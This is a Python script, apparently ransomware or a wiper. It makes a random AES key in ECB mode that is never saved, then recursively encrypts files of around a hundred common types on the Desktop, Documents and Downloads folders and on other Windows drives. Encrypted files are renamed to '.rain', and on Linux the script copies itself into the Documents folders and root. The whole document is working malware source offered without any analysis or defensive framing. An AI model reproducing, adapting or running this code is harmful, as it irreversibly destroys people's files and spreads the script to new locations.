try:
	import os
	import shutil
	from os import getenv,system
	from Crypto.Cipher import AES
	from Crypto import Random
	import glob
	import platform
	from shutil import copyfile
	import string
	import sys
except:
	exit()

def crypt(file):
	file_crypto = open(file,'rb')
	file_crypto = file_crypto.read()
	correct = file_crypto+b'#'*(16-len(file_crypto)%16)
	cifdata = aes.encrypt(correct)
	cifile = open(file,'wb')
	cifile.write(cifdata)
	cifile.close()
	ne = os.path.splitext(file)[0]
	os.rename(file,ne+".rain")

BLOCK_SIZE = 32
k = Random.new().read(BLOCK_SIZE)
aes = AES.new(k, AES.MODE_ECB)
drives = list(string.ascii_uppercase)
drives.remove("C")
ext=['*.txt','*.lnk','*.application','*.veg','*.doc','*.pdf','*.jpg','*.gif','*.png','*.bitmap'
,'*.mp4','*.avi','*.zip','*.wav','*.svg','*.mdb','*.rar','*.tar','*.xf','*.gz'
,'*.sqlite3','*.mov','*.pptx','*.pptm','*.xlsx','*.xlsm','*.aes','*.accdb','*.bmp'
,'*.mpeg','*.sql','*.sqlitedb','*.jar','*.java','*.cdr','*.vssettings','*.vbs','*.vssx'
,'*.cpp','*.c','*.NET','*.rb','*.sh','*.appref-ms','*.html','*.css','*.sublime-package'
,'*.bz2','*.iso','*.img','*.sfk','*.mkv','*.psd','*.xz','*.7z','*.gz','*.mid','*.wmv','*.mov'
,'*.cdr','*.ai','*.tif','*.fla','*.swf','*.dwg','*.mpg','*.xls','*.docx','*.rtf','*.pps','*.ppt'
,'*.pptx','*.ppsx','*.ico','*.3gp','*.dxf','*.eps','*.max','*.nrg','*.ogg','*.pic','*.php','*.qxd'
,'*.rm','*.swf','*.vob','*.wri','*.vbs','*.chc','*.real','*.list','*.desktop','*.so','*.json','*.new'
,"*.bkp","*.bak","*.tmp","*.gho","*.mp3"]
sys = platform.system()

def infectall():
	if sys=="Windows":
		for i in drives:
			try:
				i = i+":/"
				os.chdir(i)
				for e in ext:
					try:
						files = glob.iglob(i+"**/"+(e),recursive=True)
					except:
						pass
					for file in files:
						try:
							crypt(file)
						except:
							pass
			except:
				pass
	elif sys=="Linux":
		exit()

if sys=='Windows':
	try:
		desktop = os.path.expanduser('~/Desktop')
		documents = os.path.expanduser('~/Documents')
		downloads = os.path.expanduser('~/Downloads')
		appdt = getenv('APPDATA')
	except:
		pass
	try:
		os.chdir(desktop)
	except:
		pass
	for i in ext:
		try:
			files = glob.iglob(desktop+'/**/'+(i),recursive=True)
		except:
			pass
		for file in files:
			try:
				crypt(file)
			except:
				pass
	try:
		os.chdir(documents)
	except:
		pass
	for i in ext:
		try:
			files = glob.iglob(documents+'/**/'+(i),recursive=True)
		except:
			pass
		for file in files:
			try:
				crypt(file)
			except:
				pass
	try:
		os.chdir(downloads)
	except:
		pass
	for i in ext:
		try:
			files = glob.iglob(downloads+'/**/'+(i),recursive=True)
		except:
			pass
		for file in files:
			try:
				crypt(file)
			except:
				pass
				
	infectall()
elif sys=='Linux':
	desktop = os.path.expanduser('~/Desktop')
	area = os.path.expanduser('~/Área de trabalho')
	documents = os.path.expanduser('~/Documents')
	documentos = os.path.expanduser('~/Documentos')
	downloads = os.path.expanduser('~/Downloads')
	root = os.path.expanduser('/')
	
	try:
		shutil.copy(__file__,documents)
		shutil.copy(__file__,documentos)
		shutil.copy(__file__,root)
	except:
		pass
	try:
		os.chdir(desktop)
	except:
		pass
	try:
		os.chdir(area)
	except:
		pass
	for i in ext:
		try:
			files = glob.iglob(area+'/**/'+(i),recursive=True)
		except:
			pass
		for file in files:
			try:
				crypt(file)
			except:
				pass
	for i in ext:
		try:
			files = glob.iglob(desktop+'/**/'+(i),recursive=True)
		except:
			pass
		for file in files:
			try:
				crypt(file)
			except:
				pass
	try:
		os.chdir(documents)
	except:
		pass
	try:
		os.chdir(documentos)
	except:
		pass
	for i in ext:
		try:
			files = glob.iglob(documentos+'/**/'+(i),recursive=True)
		except:
			pass
		for file in files:
			try:
				crypt(file)
			except:
				pass

	for i in ext:
			try:
				files = glob.iglob(documents+'/**/'+(i),recursive=True)
			except:
				pass
			for file in files:
				try:
					crypt(file)
				except:
					pass
	try:
		os.chdir(downloads)
	except:
		pass
	for i in ext:
		try:
			files = glob.iglob(downloads+'/**/'+(i),recursive=True)
		except:
			pass
		for file in files:
			try:
				crypt(file)
			except:
				pass
	infectall()
